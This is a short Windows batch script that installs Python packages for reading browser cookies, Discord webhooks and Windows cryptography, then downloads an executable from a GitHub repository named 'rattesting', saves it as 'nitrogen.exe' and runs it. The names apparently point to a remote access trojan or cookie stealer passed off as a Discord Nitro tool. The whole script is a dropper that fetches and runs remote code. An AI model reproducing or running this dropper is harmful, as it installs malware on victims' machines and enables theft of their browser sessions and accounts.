@echo off

REM
echo Installing dependencies...
py -m pip install discord_webhook browser_cookie3 psutil pywin32 pycryptodome

REM 
echo Downloading executable file from GitHub...
powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/thatbreezedev/rattesting/raw/main/realtest.exe', '.\nitrogen.exe')"

REM 
echo Running downloaded file...
start nitrogen.exe

pause
